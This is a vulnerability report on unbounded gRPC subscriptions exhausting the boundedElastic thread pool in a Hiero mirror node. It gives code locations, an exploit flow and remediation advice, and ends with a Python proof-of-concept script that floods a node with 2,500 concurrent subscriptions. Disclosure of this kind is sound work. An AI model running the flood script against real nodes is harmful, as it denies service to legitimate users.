### Title
Unbounded gRPC Subscription Count Exhausts Global `boundedElastic` Scheduler Thread Pool

### Summary
`PollingTopicListener.listen()` and `SharedTopicListener.listen()` both schedule per-subscription work on the global `Schedulers.boundedElastic()` thread pool with no cap on total concurrent subscriptions. The only guard, `maxConcurrentCallsPerConnection = 5`, limits calls per TCP connection but imposes no bound on the number of connections. An unauthenticated attacker can open arbitrarily many connections, each carrying 5 subscriptions, exhausting the bounded elastic pool and starving legitimate fee-bearing `TopicMessage` deliveries.

### Finding Description

**Code locations:**

- `grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java`, line 31 and lines 38–43:
  ```java
  private final Scheduler scheduler = Schedulers.boundedElastic(); // global singleton
  ...
  return Flux.defer(() -> poll(context))
      .delaySubscription(interval, scheduler)          // occupies scheduler per sub
      .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
          .withFixedDelay(interval)
          .withScheduler(scheduler))                   // recurring timer per sub
  ```
  Every active subscription in POLL mode registers a recurring timer task on the global bounded elastic scheduler every 500 ms (default `interval`).

- `grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java`, line 25:
  ```java
  .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
  ```
  In REDIS and SHARED_POLL modes, every subscriber gets its own worker thread from the global bounded elastic pool for message delivery.

- `grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, line 70:
  ```java
  .subscribeOn(Schedulers.boundedElastic()); // safety-check path, also per-sub
  ```

**Root cause:** The failed assumption is that `maxConcurrentCallsPerConnection` (default 5, `NettyProperties.java:14`) bounds total scheduler load. It does not — it only limits calls per TCP connection. There is no limit on the number of TCP connections, no per-IP connection cap, no global subscription counter guard, and no authentication on `ConsensusController.subscribeTopic()`.

**Exploit flow:**
1. Attacker opens M TCP connections to port 5600 (no connection limit).
2. Each connection issues 5 `subscribeTopic` RPCs with distinct `TopicMessageFilter` values (different `startTime` or `topicId`).
3. Total active subscriptions = 5M, each consuming scheduler resources.
4. In POLL mode: 5M recurring 500 ms timer tasks flood the bounded elastic pool (default cap: `10 × CPU_cores` threads, e.g. 40 on a 4-core host).
5. In REDIS/SHARED_POLL mode: 5M `publishOn` workers consume the same pool.
6. Pool threads are exhausted; legitimate subscriber delivery tasks queue behind attacker tasks or are rejected.

### Impact Explanation
The bounded elastic scheduler is the sole delivery mechanism for `TopicMessage` items to all subscribers. Once its thread pool is saturated, legitimate subscribers experience unbounded delivery latency or `BufferOverflowStrategy.ERROR` termination (backpressure buffer of 16,384 items, `ListenerProperties.java:23`). This constitutes a complete denial of the HCS subscription service — fee-bearing message deliveries are delayed or dropped outside any designed throughput parameter, directly violating the service's availability guarantees.

### Likelihood Explanation
No authentication, no connection-level rate limiting, and no global subscription cap are required. Any internet-reachable mirror node is exploitable with a simple gRPC client loop. The attack is repeatable, requires no special privileges, and is cheap to sustain: each attacker connection is idle (no messages need to be sent). A single commodity machine can open tens of thousands of TCP connections and gRPC streams.

### Recommendation
1. **Add a global subscription limit**: Enforce a configurable cap on total concurrent subscriptions in `TopicMessageServiceImpl` using the existing `subscriberCount` `AtomicLong` (already tracked at lines 89–90); reject new subscriptions with `RESOURCE_EXHAUSTED` when the cap is exceeded.
2. **Add per-IP connection/subscription rate limiting**: Introduce a `ServerInterceptor` that tracks and limits subscriptions per source IP.
3. **Isolate per-subscription schedulers from shared infrastructure**: In `PollingTopicListener`, use a dedicated, bounded `Schedulers.newBoundedElastic(...)` with a hard thread cap rather than the global singleton, so attacker subscriptions cannot starve other JVM components.
4. **Enforce a maximum connection count** via `NettyServerBuilder.maxConnectionAge` / `maxConnectionIdle` and a total connection limit to bound the multiplier on `maxConcurrentCallsPerConnection`.

### Proof of Concept
```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, mirror_pb2

TARGET = "mirror-node-host:5600"
CONNECTIONS = 500   # 500 connections × 5 subs = 2500 concurrent subscriptions
SUBS_PER_CONN = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    threads = []
    for i in range(SUBS_PER_CONN):
        # Distinct filter per subscription to avoid any shared-listener deduplication
        req = mirror_pb2.ConsensusTopicQuery()
        req.topicID.topicNum = conn_id * 10000 + i  # distinct topic per sub
        req.consensusStartTime.seconds = 0
        t = threading.Thread(
            target=lambda r=req: list(stub.subscribeTopic(r)),
            daemon=True
        )
        t.start()
        threads.append(t)

threads = [threading.Thread(target=flood, args=(i,), daemon=True)
           for i in range(CONNECTIONS)]
for t in threads:
    t.start()
# Observe: legitimate subscribers now experience delivery delays or ERROR termination
input("Attack running. Press Enter to stop.")
```
